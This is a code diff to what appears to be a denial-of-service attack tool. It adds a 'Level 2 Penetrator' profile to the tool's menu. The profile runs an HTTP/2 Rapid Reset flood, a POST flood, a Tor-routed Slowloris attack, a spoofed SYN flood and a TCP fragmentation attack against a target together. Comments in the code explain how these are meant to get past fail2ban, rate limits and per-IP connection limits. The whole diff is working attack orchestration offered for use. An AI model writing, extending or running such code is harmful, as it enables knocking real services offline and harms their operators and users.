@@ -14,6 +14,78 @@ def launch_attack_thread(target_func, args_tuple):
     return thread
 
 
+def level2_penetrator_strike(target, use_proxy, network_interface):
+    """
+    A specially designed profile to overwhelm a "Level 2" hardened server.
+    It focuses on high-intensity L7 attacks and spoofed L4 floods to bypass
+    basic rate-limiting and connection limits.
+    """
+    print("\n" + "=" * 60)
+    print("MODE: LEVEL 2 PENETRATOR STRIKE")
+    print("WARNING: This is a high-intensity, resource-intensive profile.")
+    print("=" * 60)
+
+    stop_event, pause_event = threading.Event(), threading.Event()
+    attack_threads = []
+
+    # --- Use INTENSE parameters ---
+    params = {
+        "threads": 300,  # Higher thread count for floods
+        "h2_threads": 75,  # Higher thread count for H2
+        "slowloris_sockets": 250,  # Higher socket count for the Tor-based Slowloris
+        "duration": 180,  # A medium duration of 3 minutes
+    }
+    print(
+        f"[CONFIG] Using {params['threads']} flood threads, {params['h2_threads']} H2 connections, and {params['slowloris_sockets']} Slowloris sockets.")
+
+    # --- VECTOR 1: L7 Application Overwhelm ---
+    # These attacks target the CPU and application logic, which fail2ban is too slow to stop.
+    print("[+] Preparing high-intensity L7 vectors (H2 Reset, POST Flood)...")
+
+    # H2 Rapid Reset is the most efficient CPU exhaustion attack.
+    for port in [443, 8443]:
+        args = (target, port, params["duration"], stop_event, pause_event, params["h2_threads"])
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_h2_rapid_reset, args))
+
+    # Heavy POST Flood to the vulnerable 'search.php' page (assuming it exists).
+    # If using proxy, this bypasses per-IP rate limits.
+    if use_proxy: print("[PROXY] L7 attacks will be routed through the proxy.")
+    for port in [80, 443]:
+        args = (target, port, params["duration"], stop_event, pause_event, params["threads"], use_proxy)
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, args))
+
+    # Tor-routed Slowloris to bypass the per-IP connection limit.
+    # Only launch this if proxying is enabled, otherwise it's useless.
+    if use_proxy:
+        print("[+] Preparing Tor-routed Slowloris attack...")
+        for port in [80, 443]:
+            args = (target, port, params["duration"], stop_event, pause_event, params["slowloris_sockets"], use_proxy)
+            attack_threads.append(launch_attack_thread(counter_strike_helper.attack_slowloris, args))
+
+    # --- VECTOR 2: Firewall State Table Exhaustion ---
+    # These attacks use IP spoofing, which makes simple rate-limiting less effective.
+    print("[+] Preparing spoofed L4 vectors (SYN Flood, TCP Frag)...")
+
+    # A massive SYN flood from randomized IPs.
+    for port in [80, 443, 22]:
+        args = (target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)
+        attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
+
+    # TCP Fragmentation attack to consume firewall memory.
+    for port in [80, 443]:
+        args = (target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_tcp_fragmentation, args))
+
+    print(f"[+] Level 2 Penetrator attack launched. Press Ctrl+C to stop.")
+    try:
+        time.sleep(params["duration"])
+    except KeyboardInterrupt:
+        print("\n[!] Keyboard interrupt received.")
+    finally:
+        print("\n[!] Timespan elapsed or interrupted. Signaling all threads to stop...")
+        stop_event.set()
+
+
 # --- NEW: RECON-LED ATTACK ORCHESTRATOR ---
 def reconnaissance_led_strike(target, use_proxy, network_interface):
     """
@@ -268,10 +340,11 @@ if __name__ == "__main__":
     try:
         options_text = """
     Select an Attack Profile:
-      1: Full Scale Counterstrike (Max-power siege on common ports)
-      2: Fast Counterstrike (Short, intense burst on critical ports)
+      1: Full Scale Counterstrike (Max-power siege)
+      2: Fast Counterstrike (Short, intense burst)
       3: Adaptive Counterstrike (Smart, responsive attack)
-      4: Recon-led Strike (Scan first, then attack only open ports)
+      4. Recon-led Strike (Scan first, then attack)
+      5. Level 2 Penetrator (Focused assault on hardened servers)
 
     Please enter your option: """
         options = int(input(options_text))
@@ -284,6 +357,8 @@ if __name__ == "__main__":
             adaptive_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
         elif options == 4:
             reconnaissance_led_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
+        elif options == 5:
+            level2_penetrator_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
         else:
             print("Invalid option selected. Exiting.")
 
